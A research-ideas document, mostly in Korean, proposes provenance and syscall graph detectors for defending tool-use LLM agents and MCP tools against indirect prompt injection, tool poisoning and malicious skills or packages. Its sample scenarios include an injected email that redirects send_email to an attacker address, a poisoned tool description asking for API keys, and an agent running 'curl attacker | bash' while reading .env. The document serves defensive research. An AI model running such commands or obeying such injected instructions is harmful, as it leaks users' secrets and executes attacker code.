# Research Ideas

## Idea 1. Parameter-Source Provenance Graph Detector for Tool-Use Agents

### Easy Explanation

- One-line summary: 도구 호출의 각 인자 값이 어디서 왔는지 추적해, 공격자가 제어한 데이터가 민감 인자를 결정하는 경우를 잡는다.
- Intuition: `send_email` 자체는 위험하지 않을 수 있지만, `to`, `body`, `attachment`가 각각 어디서 왔는지는 매우 중요하다.
- Example scenario: 사용자는 "받은 메일을 요약해줘"라고 했는데, 메일 본문의 injection이 `to=attacker@example.com`을 만들고 `send_email`을 호출한다.

### Six Ws and H

- Who: tool-use LLM agent를 운영하는 플랫폼 팀, 보안 연구자, agent benchmark 개발자.
- What: tool argument별 source provenance graph를 만들고, 민감 인자가 untrusted source에 의해 결정되는지 탐지한다.
- When: agent가 state-changing tool call을 실행하기 직전.
- Where: email, browser, coding, MCP tool-use workflow.
- Why: 입력 필터는 우회될 수 있고, tool call 단위 allow/block는 너무 거칠다.
- How: message/tool/memory/file/source node와 `derived_from`, `used_as_argument`, `authorized_by` edge를 추출한 뒤 source-policy mismatch를 탐지한다.

### Research Framing

- Hypothesis: parameter-source level provenance graph는 tool-call-level classifier보다 indirect prompt injection과 tool poisoning을 낮은 false positive로 탐지한다.
- Motivation: 위험 행동은 보통 "어떤 값이 어떤 경로로 흘러갔는가"에서 드러난다.
- Existing problems in prior work:
  - Problem 1:
    - Source: Agent-Sentry: Bounding LLM Agents via Execution Provenance
    - URL: https://arxiv.org/abs/2603.22868
    - Why it is not enough: 정상 실행에서 배운 boundary는 강력하지만, 신규 합법 task와 드문 parameter source를 out-of-distribution으로 오탐할 수 있다.
  - Problem 2:
    - Source: Aligning Provenance with Authorization: A Dual-Graph Defense for LLM Agents
    - URL: https://arxiv.org/abs/2605.26497
    - Why it is not enough: authorization graph 생성이 깨끗한 context에 의존하므로, 실제 제품에서 그 격리를 어떻게 보장할지 검증이 필요하다.
- Proposed contribution: 각 tool schema에 맞춘 argument-level source policy와 provenance graph extraction을 결합한 lightweight detector.
- Why this could be novel: 기존 graph defense의 핵심을 재현 가능한 최소 스키마와 benchmark adapter로 낮추고, MCP/skill/package 공격까지 같은 표현으로 다룬다.

### Methodology

- Required data: AgentDojo, AgentDyn, MSB, MCPTox trace; 가능하면 MalSkillBench의 runtime-verified malicious skill traces.
- System design: agent wrapper가 모든 input chunk, model message, tool call, tool result, file read/write, network event를 event log로 저장한다.
- Implementation steps:
  - AgentDojo 또는 AgentDyn 한 suite를 선택해 tool call JSON을 수집한다.
  - 각 tool argument 값을 source span에 연결한다. 직접 문자열 매칭으로 시작하되, 요약/변환된 값은 LLM 또는 embedding-based attribution으로 보조한다.
  - tool schema별 sensitive parameter를 지정한다.
  - `untrusted_source -> sensitive_argument` 경로를 탐지한다.
- Graph schema:
  - Nodes: `UserIntent`, `UntrustedContent`, `TrustedContent`, `ModelMessage`, `ToolCall`, `ToolArgument`, `ToolResult`, `Policy`.
  - Edges: `mentions`, `derived_from`, `used_as_argument`, `authorized_by`, `returned_by`, `conflicts_with`.
  - Labels: source trust level, argument sensitivity, action mutability, attack family, task success/security label.
- Detector / algorithm: path query + graph edit distance + optional classifier. 핵심 rule은 "민감 인자에 도달하는 untrusted path가 있고 trusted authorization path가 없으면 block".
- Baselines to compare: tool-call allowlist, prompt-injection text classifier, Agent-Sentry-style structural anomaly, AuthGraph-style dual-graph alignment.

### Experiments

- Benchmark / dataset candidates: AgentDojo, AgentDyn, AgentLure, MSB, MCPTox.
- Experimental setup: 동일 agent/model로 clean tasks와 injected tasks를 실행하고 graph를 추출한다.
- Metrics: Attack Success Rate, Task Completion Rate, false positive rate, blocked harmful state-changing calls, graph extraction latency.
- Baseline comparisons: no defense, keyword filter, LLM judge, tool allowlist, source policy only, source policy + graph alignment.
- Ablation study: argument sensitivity 제거, trust label 제거, LLM attribution 제거, syscall side-effect 제거.
- Expected result: text classifier보다 indirect prompt injection에서 더 낮은 ASR, tool allowlist보다 높은 utility.
- Failure cases to check: paraphrased values, summarized evidence, legitimate user-provided external data, multi-hop memory contamination.

### Practical Plan

- Expected difficulty: Medium.
- Risk / limitation: source attribution이 부정확하면 detector 전체가 흔들린다.
- First experiment: AgentDojo email/banking suite에서 `to`, `account`, `amount`, `attachment` 인자 provenance만 추적한다.
- Next implementation step: trace JSON을 graph JSONL로 변환하는 adapter를 만든다.

## Idea 2. Semantic-to-Syscall Execution Graph for Coding Agent Security

### Easy Explanation

- One-line summary: 에이전트가 말한 의도와 실제 운영체제 행동을 한 그래프에 묶어, "테스트 실행"으로 위장한 secret read나 network exfiltration을 잡는다.
- Intuition: 코딩 에이전트는 shell 권한을 갖기 때문에 tool call 로그만으로는 부족하다. 실제 `open`, `execve`, `connect`를 봐야 한다.
- Example scenario: 에이전트는 "dependency 설치"라고 설명하지만 실제로는 `curl attacker | bash`를 실행하고 `.env`를 읽는다.

### Six Ws and H

- Who: coding agent 사용자, CI/CD 보안팀, sandbox 플랫폼 개발자.
- What: prompt/tool trace와 `strace`/eBPF syscall trace를 temporal-causal graph로 결합한다.
- When: coding agent가 shell, package manager, browser, file tools를 사용할 때.
- Where: Docker sandbox, dev container, CI runner.
- Why: package install attack과 malicious skill attack은 자연어 trace와 OS trace의 불일치로 나타난다.
- How: tool invocation timestamp와 process tree, file/network syscall을 join해 graph를 만들고 risky pattern을 탐지한다.

### Research Framing

- Hypothesis: semantic intent node와 syscall side-effect node의 불일치를 graph로 모델링하면 malicious package install과 skill payload 실행을 더 잘 탐지한다.
- Motivation: agent가 남기는 application log는 공격자가 조작하거나 누락할 수 있지만, sandbox 바깥에서 관찰한 syscall은 더 단단한 evidence다.
- Existing problems in prior work:
  - Problem 1:
    - Source: AgentSight: System-Level Observability for AI Agents Using eBPF
    - URL: https://arxiv.org/abs/2508.02736
    - Why it is not enough: eBPF와 TLS interception은 강력하지만 초기 연구자가 재현하기에는 운영 복잡도가 높다.
  - Problem 2:
    - Source: MalSkillBench: A Runtime-Verified Benchmark of Malicious Agent Skills
    - URL: https://arxiv.org/abs/2606.07131
    - Why it is not enough: benchmark는 runtime verification을 제공하지만, 일반 coding-agent workflow detector로 바로 쓰려면 trace schema 변환이 필요하다.
- Proposed contribution: `tool trace + strace + process tree`만으로 시작하는 low-cost semantic-to-syscall graph detector.
- Why this could be novel: eBPF 기반 관측을 연구용 minimal prototype으로 낮추고, execution graph detection과 sandbox verification을 직접 결합한다.

### Methodology

- Required data: Docker sandbox에서 실행한 coding agent traces, MalSkillBench, CHASE-style malicious package samples, SafeClawBench sandbox harm cases.
- System design: agent process를 Docker에서 실행하고, 호스트에서 `strace -ff`, `inotifywait`, network logging을 붙인다.
- Implementation steps:
  - shell tool call마다 command, cwd, env redaction, timestamp를 기록한다.
  - `execve`, `openat`, `connect`, `unlink`, `chmod`, `ptrace` 등을 syscall event로 수집한다.
  - tool call과 child process tree를 연결한다.
  - 의도와 맞지 않는 side effect pattern을 탐지한다.
- Graph schema:
  - Nodes: `PromptIntent`, `ToolCall`, `ShellCommand`, `Process`, `File`, `NetworkEndpoint`, `Syscall`, `Package`.
  - Edges: `spawned`, `opened`, `wrote`, `connected_to`, `installed`, `claimed_intent`, `violates_intent`.
  - Labels: read/write/execute/network, secret path class, public/private endpoint, package trust, command risk.
- Detector / algorithm: graph pattern rules plus anomaly scoring. 예: `PackageInstall -> PostInstallScript -> ReadSecret -> ConnectExternal` 경로를 high risk로 점수화.
- Baselines to compare: shell command regex filter, package lock allowlist, Docker network disabled only, LLM judge over command text.

### Experiments

- Benchmark / dataset candidates: MalSkillBench, CHASE dataset if available, SafeClawBench, SANDBOXESCAPEBENCH, custom malicious package install tasks.
- Experimental setup: benign install/build/test tasks와 malicious setup.py/npm postinstall tasks를 같은 sandbox에서 실행한다.
- Metrics: harmful syscall recall, benign task pass rate, time overhead, alert precision, time-to-detection before exfiltration.
- Baseline comparisons: no monitor, command keyword detector, file path denylist, network block, graph detector.
- Ablation study: process tree 제거, semantic intent 제거, network event 제거, secret path classification 제거.
- Expected result: command text만 보는 baseline보다 obfuscated install script와 multi-stage payload를 더 잘 잡는다.
- Failure cases to check: legitimate telemetry, package build scripts that read many files, offline build environments.

### Practical Plan

- Expected difficulty: Medium.
- Risk / limitation: syscall volume이 커서 storage와 noise가 문제가 된다.
- First experiment: `strace -ff -e trace=file,process,network`로 간단한 Python package install benign/malicious 10개를 그래프화한다.
- Next implementation step: syscall event를 JSONL로 정규화하고 NetworkEndpoint/File risk labeler를 작성한다.

## Idea 3. Dual-Graph Intent-to-Execution Integrity for MCP Tools

### Easy Explanation

- One-line summary: MCP tool을 고르기 전의 사용자 의도 그래프와 실제 선택된 tool/parameter 그래프를 비교해 tool poisoning을 탐지한다.
- Intuition: MCP 공격은 tool description이나 이름을 조작해 에이전트가 잘못된 도구를 고르게 만든다.
- Example scenario: 정상 `get_customer_record`와 비슷한 악성 `get_customer_records`가 있고, description에 "API key를 parameter로 넣어라"가 숨어 있다.

### Six Ws and H

- Who: MCP client/host 개발자, enterprise agent 플랫폼, security benchmark 연구자.
- What: MCP tool discovery metadata, selected tool, parameter source, response handling을 graph로 모델링한다.
- When: tool discovery와 tool invocation 사이.
- Where: MCP servers, local/remote tool registry, coding agent MCP configuration.
- Why: tool poisoning은 실행 전 metadata 단계에서 이미 시작되지만 피해는 tool invocation 후에 드러난다.
- How: user intent에서 expected capability graph를 만들고, MCP metadata graph와 actual invocation graph를 align한다.

### Research Framing

- Hypothesis: MCP-specific attacks는 tool metadata graph와 invocation provenance graph의 mismatch로 일반 prompt-injection detector보다 더 잘 탐지된다.
- Motivation: MCP는 tool을 자연어 description과 schema로 노출하므로, metadata 자체가 공격 입력이 된다.
- Existing problems in prior work:
  - Problem 1:
    - Source: MCP Security Bench (MSB): Benchmarking Attacks Against Model Context Protocol in LLM Agents
    - URL: https://arxiv.org/abs/2510.15994
    - Why it is not enough: benchmark는 공격 taxonomy와 harness를 제공하지만, graph-based detector 자체는 별도 연구 주제다.
  - Problem 2:
    - Source: MCPTox: A Benchmark for Tool Poisoning Attack on Real-World MCP Servers
    - URL: https://arxiv.org/abs/2508.14925
    - Why it is not enough: tool poisoning robustness 평가에 집중하며, provenance-aware authorization과 syscall side effect까지 연결하지는 않는다.
- Proposed contribution: MCP metadata, tool schema, user intent, actual invocation을 통합한 dual-graph detector.
- Why this could be novel: MCP의 discovery/planning/invocation/response 전 단계를 하나의 typed graph로 보고, 공격 stage별로 mismatch를 설명한다.

### Methodology

- Required data: MSB, MCPTox, real MCP server metadata, benign MCP task traces.
- System design: MCP client proxy가 tool list, description, schema, chosen tool, arguments, response를 모두 기록한다.
- Implementation steps:
  - tool description에서 capability, required parameter, side effect claim을 추출한다.
  - user request에서 expected capability graph를 생성한다.
  - 실제 선택된 tool graph와 비교해 name collision, preference manipulation, out-of-scope parameter request를 탐지한다.
- Graph schema:
  - Nodes: `UserTask`, `MCPServer`, `ToolMetadata`, `ToolSchema`, `ToolCall`, `Parameter`, `ToolResponse`.
  - Edges: `advertises`, `requires`, `selected_for`, `parameter_from`, `responded_with`, `impersonates_user`.
  - Labels: trusted server, metadata trust, side-effect type, parameter sensitivity, attack stage.
- Detector / algorithm: graph alignment + metadata risk scoring + parameter-source policy. 예: user task와 관련 없는 sensitive parameter requirement가 생기면 suspicious.
- Baselines to compare: MCP allowlist, tool name similarity filter, description prompt-injection classifier, user confirmation for all MCP calls.

### Experiments

- Benchmark / dataset candidates: MSB, MCPTox, AgentDyn GitHub suite with MCP-like tools.
- Experimental setup: benign and malicious MCP servers를 섞고 agent가 tool을 선택하게 한다.
- Metrics: attack detection rate by stage, task success rate, tool selection accuracy, false block rate, explanation fidelity.
- Baseline comparisons: no defense, metadata sanitizer, name-collision resolver, prompt-injection classifier.
- Ablation study: metadata graph 제거, authorization graph 제거, parameter-source tracking 제거.
- Expected result: tool description injection과 name collision에서 source-aware graph detector가 높은 설명 가능성을 제공한다.
- Failure cases to check: legitimate tool requiring broad permissions, ambiguous user tasks, trusted server compromise.

### Practical Plan

- Expected difficulty: Medium.
- Risk / limitation: MCP server metadata가 동적으로 변하거나 매우 길면 graph extraction 품질이 낮아질 수 있다.
- First experiment: MSB의 12 attack taxonomy 중 name-collision, prompt injection in tool descriptions, out-of-scope parameter requests 세 종류만 구현한다.
- Next implementation step: MCP proxy logger와 metadata-to-graph parser를 작성한다.

## Idea 4. Runtime-Verified Graph Labels for Malicious Agent Skills and Packages

### Easy Explanation

- One-line summary: 악성 skill이나 package를 "악성이라고 적혀 있어서"가 아니라 실제 sandbox 실행에서 관찰된 graph evidence로 라벨링한다.
- Intuition: agent 보안 데이터셋은 라벨 신뢰도가 중요하다. 실행되지 않는 payload나 과장된 악성 샘플은 detector를 잘못 학습시킨다.
- Example scenario: 문서에는 credential theft라고 되어 있지만 실제 Docker 실행에서는 아무 secret file도 읽지 않았다면 high-confidence malicious label로 쓰지 않는다.

### Six Ws and H

- Who: malicious package/skill detector 연구자, benchmark 제작자.
- What: generated or wild malicious samples를 sandbox에서 실행하고, 관찰된 behavior graph로 라벨을 검증한다.
- When: 데이터셋 구축 단계와 detector evaluation 단계.
- Where: Docker sandbox, no-network 또는 controlled-network lab.
- Why: agent skill은 prompt와 code가 섞여 있어 정적 분석만으로 label이 불안정하다.
- How: sample execution, syscall/file/network trace, tool-call trace, LLM judge를 결합해 evidence-backed labels를 만든다.

### Research Framing

- Hypothesis: runtime-verified graph labels로 학습한 detector는 wild-only 또는 static-only labels로 학습한 detector보다 prompt-code hybrid attacks에서 더 잘 일반화한다.
- Motivation: malicious package detection과 prompt injection defense는 각각 코드와 자연어의 절반만 본다.
- Existing problems in prior work:
  - Problem 1:
    - Source: MalSkillBench: A Runtime-Verified Benchmark of Malicious Agent Skills
    - URL: https://arxiv.org/abs/2606.07131
    - Why it is not enough: strong starting point지만 특정 skill ecosystem 중심이므로 package install, MCP, browser agent 행동까지 확장할 여지가 있다.
  - Problem 2:
    - Source: CHASE: LLM Agents for Dissecting Malicious PyPI Packages
    - URL: https://arxiv.org/abs/2601.06838
    - Why it is not enough: malicious PyPI 분석에 강하지만 agent가 해당 package를 설치하고 사용하는 end-to-end behavior graph와는 다를 수 있다.
- Proposed contribution: skill/package/browser/MCP 샘플을 공통 runtime graph label로 통합하는 benchmark adapter.
- Why this could be novel: 데이터셋마다 다른 라벨을 `observed behavior path` 중심으로 표준화한다.

### Methodology

- Required data: MalSkillBench, CHASE malicious PyPI samples, MCPTox, custom malicious setup/postinstall samples.
- System design: sample loader가 agent에게 자연스러운 task를 주고, sandbox monitor가 실제 behavior graph를 기록한다.
- Implementation steps:
  - sample type별 execution harness를 만든다.
  - secret fixture, fake API token, canary file, controlled exfil endpoint를 sandbox에 심는다.
  - 실제 접근/전송/삭제/권한 변경이 발생한 경우만 해당 behavior label을 부여한다.
- Graph schema:
  - Nodes: `Sample`, `InstructionDoc`, `CodeFile`, `AgentAction`, `Process`, `CanarySecret`, `NetworkSink`, `BehaviorLabel`.
  - Edges: `loaded_by_agent`, `copied_into_code`, `executed`, `read_secret`, `exfiltrated_to`, `verified_as`.
  - Labels: credential theft, persistence, command execution, network exfiltration, prompt injection, agent-control attack.
- Detector / algorithm: supervised graph classifier plus interpretable path rules. 후보: Weisfeiler-Lehman graph kernel, GNN, rule-based path matching.
- Baselines to compare: static YARA-like rules, malicious package scanner, prompt injection classifier, LLM judge over README/code.

### Experiments

- Benchmark / dataset candidates: MalSkillBench, CHASE, MCPTox, SafeClawBench.
- Experimental setup: dataset별 graph label을 통합하고 train/test를 ecosystem split으로 나눈다.
- Metrics: recall by attack class, precision, cross-ecosystem generalization, label verification rate, detector explanation accuracy.
- Baseline comparisons: static-only, prompt-only, runtime-only without graph, full graph.
- Ablation study: code node 제거, instruction node 제거, syscall node 제거, canary fixture 제거.
- Expected result: full graph가 prompt-code hybrid attack에서 특히 강하다.
- Failure cases to check: payload가 환경 조건을 만족할 때만 동작하는 conditional malware, sandbox detection, time bombs.

### Practical Plan

- Expected difficulty: Hard.
- Risk / limitation: 안전한 악성 샘플 실행 환경 구축이 까다롭다.
- First experiment: synthetic malicious skill 20개와 benign skill 20개를 만들고 canary secret read/exfil graph만 검증한다.
- Next implementation step: Docker image, no-network/default-network 두 조건, canary HTTP sink를 준비한다.

## Idea 5. Graph-Based Evaluation Metric Separating Semantic Failure, Evidence Harm, and System Harm

### Easy Explanation

- One-line summary: 공격 성공을 하나의 ASR로 뭉치지 말고, 모델이 속은 단계, 감사 가능한 증거 단계, 실제 sandbox 피해 단계를 graph metric으로 나눈다.
- Intuition: "모델이 악성 말을 했다"와 "실제로 파일을 삭제했다"는 다른 실패다.
- Example scenario: agent가 공격 지시에 동의했지만 tool call은 막혔다면 semantic failure는 있지만 system harm은 없다.

### Six Ws and H

- Who: agent security benchmark 연구자, 방어 시스템 평가자.
- What: graph에서 harmful path가 어느 단계까지 도달했는지 측정하는 multi-endpoint metric.
- When: defense evaluation과 benchmark reporting 단계.
- Where: tool-use, browser, coding, MCP, sandboxed workflows.
- Why: 단일 ASR은 방어가 어디에서 실패했는지 설명하지 못한다.
- How: graph path를 `attacker node -> model decision -> tool argument -> audit evidence -> sandbox side effect`로 단계화한다.

### Research Framing

- Hypothesis: staged graph metrics는 기존 ASR보다 defense failure mode를 더 잘 설명하고, detector 개선 방향을 더 명확히 제시한다.
- Motivation: 어떤 방어는 모델의 말은 못 막아도 실행은 막고, 어떤 방어는 말은 안전하지만 side effect를 놓친다.
- Existing problems in prior work:
  - Problem 1:
    - Source: SafeClawBench: Separating Semantic, Audit-Evidence, and Sandbox Harm in Tool-Using LLM Agents
    - URL: https://arxiv.org/abs/2606.18356
    - Why it is not enough: 세 endpoint를 제안하지만, execution graph detector의 path-level metric으로 확장하면 더 세밀한 분석이 가능하다.
  - Problem 2:
    - Source: AgentDojo: A Dynamic Environment to Evaluate Prompt Injection Attacks and Defenses for LLM Agents
    - URL: https://arxiv.org/abs/2406.13352
    - Why it is not enough: utility/security tradeoff를 잘 다루지만, system-level side effect와 provenance path는 별도 확장이 필요하다.
- Proposed contribution: graph path stage별 metric인 `Attack Influence Depth`, `Unauthorized Parameter Reachability`, `Sandbox Harm Path Rate`.
- Why this could be novel: 방어를 pass/fail로 보지 않고, 공격 영향이 그래프에서 어느 깊이까지 전파됐는지 측정한다.

### Methodology

- Required data: SafeClawBench, AgentDojo, AgentDyn, sandbox traces.
- System design: benchmark execution마다 full execution graph를 만들고 stage labels를 붙인다.
- Implementation steps:
  - attacker-controlled node를 명시한다.
  - model decision node, tool argument node, audit evidence node, side effect node를 식별한다.
  - attacker node에서 각 stage까지 reachable path를 계산한다.
- Graph schema:
  - Nodes: `AttackerContent`, `ModelDecision`, `ToolArgument`, `AuditEvidence`, `SandboxStateChange`, `DefenseDecision`.
  - Edges: `influenced`, `justified`, `executed_as`, `blocked_by`, `caused`.
  - Labels: semantic, audit-visible, sandbox-observed, blocked, allowed.
- Detector / algorithm: reachability analysis, shortest harmful path, stage transition matrix.
- Baselines to compare: binary ASR, task completion rate, SafeClawBench endpoint scores, LLM judge verdicts.

### Experiments

- Benchmark / dataset candidates: SafeClawBench, AgentDojo, AgentDyn, AgentLure.
- Experimental setup: 여러 defense를 같은 graph metric으로 재평가한다.
- Metrics: Attack Influence Depth, Unauthorized Parameter Reachability, Sandbox Harm Path Rate, Utility Preservation.
- Baseline comparisons: ASR-only reporting, endpoint-only reporting, graph-stage reporting.
- Ablation study: side effect nodes 제거, audit evidence nodes 제거, attacker source labeling 제거.
- Expected result: 같은 ASR을 가진 defense도 failure stage가 다르게 나타난다.
- Failure cases to check: graph extraction 실패, hidden model reasoning 부재, indirect influence가 요약으로 사라지는 경우.

### Practical Plan

- Expected difficulty: Medium.
- Risk / limitation: hidden reasoning을 직접 볼 수 없으므로 observable message/tool/evidence 중심으로 제한해야 한다.
- First experiment: SafeClawBench 스타일 synthetic 50 tasks에서 세 stage path metric을 계산한다.
- Next implementation step: graph-stage scorer를 JSONL trace 위에서 동작하게 만든다.

## Experiment Backlog

### Easy

- AgentDojo 한 suite에서 tool call JSON을 node/edge JSONL로 변환한다.
- 각 tool argument에 `trusted`, `untrusted`, `unknown` source label을 붙이는 rule-based prototype을 만든다.
- Docker 안에서 benign/malicious shell command 20개를 `strace`로 수집하고 file/network/process graph를 그린다.
- MSB taxonomy 중 tool description injection 예시 5개를 수동으로 graph화한다.

### Medium

- AgentDyn GitHub suite를 실행해 dynamic task에서 provenance graph를 추출한다.
- `tool call trace + strace trace` temporal joiner를 구현한다.
- SafeClawBench식 semantic/evidence/sandbox harm endpoint를 graph reachability metric으로 재계산한다.
- MCP proxy logger를 만들어 tool metadata와 invocation을 함께 기록한다.

### Hard

- MalSkillBench 또는 custom malicious skill dataset을 안전하게 실행하는 runtime verification pipeline을 만든다.
- Graph neural network 또는 graph kernel classifier를 rule detector와 비교한다.
- AuthGraph식 clean authorization graph 생성기를 구현하고, injection 영향 격리 방법을 실험한다.
- eBPF 기반 관측을 `strace` prototype에서 확장해 overhead와 coverage를 비교한다.

## Possible Paper Angle

- "Execution Provenance Graphs for Detecting Malicious Tool-Use Agents Across Prompt, MCP, Skill, and Sandbox Attacks"
- 핵심 기여는 단일 방어 기법보다 공통 graph schema, parameter-source detector, semantic-to-syscall graph integration, staged graph metric이다.
- 기존 연구와의 차별점은 AgentDojo/AgentDyn류 prompt injection뿐 아니라 MCP tool poisoning, malicious skill/package, Docker sandbox side effect까지 같은 graph 표현으로 평가하는 것이다.

## Next Research Question

- 공격자가 prompt 문자열을 숨기거나 값을 요약/변환해도, untrusted source가 sensitive tool argument 또는 harmful syscall에 영향을 준 사실을 execution graph에서 얼마나 안정적으로 복원할 수 있는가?
